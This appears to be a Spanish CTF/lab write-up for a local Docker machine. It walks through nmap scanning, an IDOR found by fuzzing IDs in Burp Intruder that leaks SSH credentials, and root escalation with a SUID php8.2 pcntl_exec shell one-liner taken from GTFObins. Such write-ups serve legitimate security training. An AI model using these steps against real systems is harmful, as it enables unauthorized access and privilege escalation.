# Document

## **1. Información Inicial**

Desplegamos la maquina con docker

```bash
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

---

## **2. Reconocimiento (Recon)**

### 2.1 Escaneo de Puertos

- [x] **Nmap inicial**:

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts 
```

Allports

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

 **Puertos Abiertos**:
 **[Puerto 22]**:

- [x] **Nmap serveis/versions**:

```bash
sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted

```

 **Puertos Abiertos**:
 **[Puerto 22]**  OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
 **[Puerto 80]** 80/tcp open  http    Apache httpd 2.4.62 ((Debian))

---

## **2 Enumeración** (Web)

![Pasted image 20250211221856.png](<imagenes/Pasted image 20250211221856.png>)
Analizamos con Burpsuite

![Pasted image 20250211221927.png](<imagenes/Pasted image 20250211221927.png>)
 Vemos que para cada petición , genera un ID
 Vamos a tratar de encontrar ID's generados y ver si contienen algo

Mandamos la petición al Intruder
Creamos un ataque tipo "Sniper" de tipo "Numerico"
Configuramos del 1 al 1000

![Pasted image 20250211222050.png](<imagenes/Pasted image 20250211222050.png>)

En los resultados, ya vemos que por tamaño de respuesta, el ID 21 muestra algo distinto: (Tamaño 16679)
![Pasted image 20250211222217.png](<imagenes/Pasted image 20250211222217.png>)

Comprovamos el ID:
![Pasted image 20250211222251.png](<imagenes/Pasted image 20250211222251.png>)
~~![Pasted image 20250211221729.png](<imagenes/Pasted image 20250211221729.png>)~~

Encontramos login y password

---

## **4. Explotación (Exploit)**

Probamos a ingresar por SSH con ese usuario y contraseña, dado que tiene el puerot 22 abierto

![Pasted image 20250211222541.png](<imagenes/Pasted image 20250211222541.png>)

Accedemos a la maquina como Pepe.

---

## **5. Escalada de privilegios

Ahora, una vez dentro como Pepe, vamos probar a escalar nuestros privilegios

Buscamos permisos SUID

```bash
find / -perm -u=s -type f 2>/dev/null

/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/newgrp
/usr/bin/php8.2
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Encontramos `/usr/bin/php8.2
Buscamos en GTFObins

```bash
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

Explotamos

```bash
pepe@278b98666e01:/usr/bin$ ./php8.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
root
```

---

## **6. Lecciones Aprendidas**

-
- IDOR en documentos PDF

---

## **7. Recursos**

- **Referencias**:
- GTFObins  

- **Herramientas Utilizadas**:
  - **Nmap**
  - **Burpsuite**

---
